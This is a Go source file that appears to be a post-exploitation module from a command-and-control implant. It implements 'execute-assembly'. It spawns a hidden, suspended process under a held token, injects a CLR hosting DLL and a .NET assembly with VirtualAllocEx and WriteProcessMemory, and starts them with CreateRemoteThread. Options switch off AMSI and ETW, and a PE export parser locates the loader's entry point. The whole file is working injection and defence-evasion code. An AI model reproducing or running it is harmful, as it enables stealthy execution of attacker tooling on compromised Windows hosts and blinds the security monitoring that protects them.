package run

import (
	"bytes"
	"debug/pe"
	"encoding/binary"
	"fmt"
	"io"
	"os"
	"os/exec"
//	"strings"
	"syscall"
	"time"
	"unsafe"

	"golang.org/x/sys/windows"
)

var (
	modkernel32            = windows.NewLazyDLL("kernel32.dll")
	procVirtualAllocEx     = modkernel32.NewProc("VirtualAllocEx")
	procWriteProcessMemory = modkernel32.NewProc("WriteProcessMemory")
	procVirtualProtectEx   = modkernel32.NewProc("VirtualProtectEx")
	procCreateRemoteThread = modkernel32.NewProc("CreateRemoteThread")
	procGetExitCodeThread  = modkernel32.NewProc("GetExitCodeThread")

	CurrentToken windows.Token
)

const (
	PROCESS_ALL_ACCESS = windows.STANDARD_RIGHTS_REQUIRED | windows.SYNCHRONIZE | 0xfff
	STILL_ACTIVE       = 259
)

func ExecuteAssembly(CLR, assembly []byte, process, params string, amsi, etw bool, offset uint32) (string, error) {
	assemblySizeArr := convertIntToByteArr(len(assembly))
	paramsSizeArr := convertIntToByteArr(len(params) + 1)

	var stdOutBuffer, stdErrBuffer bytes.Buffer
	cmd, err := startProcess(process, &stdOutBuffer, &stdErrBuffer, true)
	if err != nil {
		return "", err
	}
	defer cmd.Process.Kill()

	pid := cmd.Process.Pid
	handle, err := windows.OpenProcess(PROCESS_ALL_ACCESS, true, uint32(pid))
	if err != nil {
		return "", err
	}
	defer windows.CloseHandle(handle)

	hostingDllAddr, err := allocAndWrite(CLR, handle, uint32(len(CLR)))
	if err != nil {
		return "", err
	}

	payload := append(assemblySizeArr, paramsSizeArr...)
	payload = append(payload, boolToByte(amsi), boolToByte(etw))
	payload = append(payload, []byte(params)...)
	payload = append(payload, 0)
	payload = append(payload, assembly...)

	assemblyAddr, err := allocAndWrite(payload, handle, uint32(len(payload)))
	if err != nil {
		return "", err
	}

	threadHandle, err := protectAndExec(handle, hostingDllAddr, 
		uintptr(hostingDllAddr)+uintptr(offset), assemblyAddr, uint32(len(CLR)))
	if err != nil {
		return "", err
	}
	defer windows.CloseHandle(threadHandle)

	if err := waitForCompletion(threadHandle); err != nil {
		return "", err
	}

	return stdOutBuffer.String() + stdErrBuffer.String(), nil
}

func boolToByte(b bool) byte {
	if b {
		return 1
	}
	return 0
}

func convertIntToByteArr(num int) []byte {
	buff := make([]byte, 4)
	binary.LittleEndian.PutUint32(buff, uint32(num))
	return buff
}

func startProcess(proc string, stdout, stderr *bytes.Buffer, suspended bool) (*exec.Cmd, error) {
	cmd := exec.Command(proc)
	cmd.SysProcAttr = &windows.SysProcAttr{
		Token:      syscall.Token(CurrentToken),
		HideWindow: true,
	}
	cmd.Stdout = stdout
	cmd.Stderr = stderr
	if suspended {
		cmd.SysProcAttr.CreationFlags = windows.CREATE_SUSPENDED
	}
	if err := cmd.Start(); err != nil {
		return nil, err
	}
	return cmd, nil
}

func allocAndWrite(data []byte, handle windows.Handle, size uint32) (uintptr, error) {
	addr, _, err := procVirtualAllocEx.Call(
		uintptr(handle),
		0,
		uintptr(size),
		uintptr(windows.MEM_COMMIT|windows.MEM_RESERVE),
		uintptr(windows.PAGE_READWRITE),
	)
	if addr == 0 {
		return 0, fmt.Errorf("VirtualAllocEx failed: %v", err)
	}

	var written uintptr
	_, _, err = procWriteProcessMemory.Call(
		uintptr(handle),
		addr,
		uintptr(unsafe.Pointer(&data[0])),
		uintptr(len(data)),
		uintptr(unsafe.Pointer(&written)),
	)
	if err != windows.ERROR_SUCCESS {
		return 0, fmt.Errorf("WriteProcessMemory failed: %v", err)
	}
	return addr, nil
}

func protectAndExec(handle windows.Handle, startAddr, threadStartAddr, argAddr uintptr, dataLen uint32) (windows.Handle, error) {
	var oldProtect uint32
	_, _, err := procVirtualProtectEx.Call(
		uintptr(handle),
		startAddr,
		uintptr(dataLen),
		uintptr(windows.PAGE_EXECUTE_READ),
		uintptr(unsafe.Pointer(&oldProtect)),
	)
	if err != windows.ERROR_SUCCESS {
		return 0, fmt.Errorf("VirtualProtectEx failed: %v", err)
	}

	threadHandle, _, err := procCreateRemoteThread.Call(
		uintptr(handle),
		0,
		0,
		threadStartAddr,
		argAddr,
		0,
		0,
	)
	if threadHandle == 0 {
		return 0, fmt.Errorf("CreateRemoteThread failed: %v", err)
	}
	return windows.Handle(threadHandle), nil
}

func waitForCompletion(threadHandle windows.Handle) error {
	for {
		var code uint32
		ret, _, _ := procGetExitCodeThread.Call(
			uintptr(threadHandle),
			uintptr(unsafe.Pointer(&code)),
		)
		if ret == 0 {
			return fmt.Errorf("GetExitCodeThread failed")
		}
		if code != STILL_ACTIVE {
			break
		}
		time.Sleep(time.Second)
	}
	return nil
}

func GetExportOffset(filePath, exportName string) (uint32, error) {
	f, err := os.Open(filePath)
	if err != nil {
		return 0, err
	}
	defer f.Close()

	peFile, err := pe.NewFile(f)
	if err != nil {
		return 0, err
	}
	defer peFile.Close()

	var dd pe.DataDirectory
	switch oh := peFile.OptionalHeader.(type) {
	case *pe.OptionalHeader32:
		dd = oh.DataDirectory[pe.IMAGE_DIRECTORY_ENTRY_EXPORT]
	case *pe.OptionalHeader64:
		dd = oh.DataDirectory[pe.IMAGE_DIRECTORY_ENTRY_EXPORT]
	default:
		return 0, fmt.Errorf("unsupported PE format")
	}

	if dd.VirtualAddress == 0 {
		return 0, fmt.Errorf("no export directory found")
	}

	// Find section containing export directory
	var exportSection *pe.Section
	for _, sec := range peFile.Sections {
		if sec.VirtualAddress <= dd.VirtualAddress && 
			dd.VirtualAddress < sec.VirtualAddress+sec.VirtualSize {
			exportSection = sec
			break
		}
	}
	if exportSection == nil {
		return 0, fmt.Errorf("export section not found")
	}

	// Calculate file offset of export directory
	exportDirOffset := dd.VirtualAddress - exportSection.VirtualAddress + exportSection.Offset

	// Read export directory
	sr := io.NewSectionReader(f, int64(exportDirOffset), int64(dd.Size))
	var ed struct {
		Characteristics       uint32
		TimeDateStamp         uint32
		MajorVersion          uint16
		MinorVersion          uint16
		Name                  uint32
		Base                  uint32
		NumberOfFunctions     uint32
		NumberOfNames         uint32
		AddressOfFunctions    uint32
		AddressOfNames        uint32
		AddressOfNameOrdinals uint32
	}
	if err := binary.Read(sr, binary.LittleEndian, &ed); err != nil {
		return 0, err
	}

	// Read name pointers
	names := make([]uint32, ed.NumberOfNames)
	nameTableOffset := rvaToFileOffset(peFile, ed.AddressOfNames)
	if _, err := f.Seek(int64(nameTableOffset), 0); err != nil {
		return 0, err
	}
	if err := binary.Read(f, binary.LittleEndian, names); err != nil {
		return 0, err
	}

	// Read ordinals
	ordinals := make([]uint16, ed.NumberOfNames)
	ordinalTableOffset := rvaToFileOffset(peFile, ed.AddressOfNameOrdinals)
	if _, err := f.Seek(int64(ordinalTableOffset), 0); err != nil {
		return 0, err
	}
	if err := binary.Read(f, binary.LittleEndian, ordinals); err != nil {
		return 0, err
	}

	// Read function addresses
	funcs := make([]uint32, ed.NumberOfFunctions)
	funcTableOffset := rvaToFileOffset(peFile, ed.AddressOfFunctions)
	if _, err := f.Seek(int64(funcTableOffset), 0); err != nil {
		return 0, err
	}
	if err := binary.Read(f, binary.LittleEndian, funcs); err != nil {
		return 0, err
	}

	// Search for export name
	for i, nameRVA := range names {
		nameOffset := rvaToFileOffset(peFile, nameRVA)
		name, err := readNullTerminatedString(f, nameOffset)
		if err != nil || name != exportName {
			continue
		}
		return funcs[ordinals[i]], nil
	}
	return 0, fmt.Errorf("export %s not found", exportName)
}

func rvaToFileOffset(peFile *pe.File, rva uint32) uint32 {
	for _, sec := range peFile.Sections {
		if sec.VirtualAddress <= rva && rva < sec.VirtualAddress+sec.VirtualSize {
			return rva - sec.VirtualAddress + sec.Offset
		}
	}
	return 0
}

func readNullTerminatedString(f *os.File, offset uint32) (string, error) {
	var result []byte
	buf := make([]byte, 1)
	for {
		_, err := f.ReadAt(buf, int64(offset))
		if err != nil || buf[0] == 0 {
			break
		}
		result = append(result, buf[0])
		offset++
	}
	return string(result), nil
}
